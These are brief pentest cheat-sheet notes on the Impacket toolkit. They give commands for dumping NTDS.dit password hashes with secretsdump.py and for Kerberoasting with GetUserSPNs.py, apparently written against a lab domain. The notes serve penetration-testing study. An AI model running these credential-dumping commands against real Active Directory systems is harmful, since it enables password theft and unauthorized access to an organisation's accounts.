# Impacket

Impacket is a suit of tool used to pentest Active Directories


## Useful pieces of code
- GetNPUsers.py (ASREP-Roasting)
- GetUserSPNs.py (Kerberoasting)
- secretDump.py (NTDS secrets)


## Dump NTDS.dit secrets w/ secretdump.py
Requirements : Credentials
```bash
secretsdump.py -just-dc backup@spookysec.local
```	
## Dump NTDS.dit secrets w/ secretdump.py
Requirements : NTDS.dit and SYSTEM files
```bash
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
```

## Kerberoast
This following command line will dump Kerberos hashes and return any kerberoastable users.  
Requirements : Credentials
```bash
GetUserSPNs.py controller.local/"username":"password" -dc-ip <IP> -request
```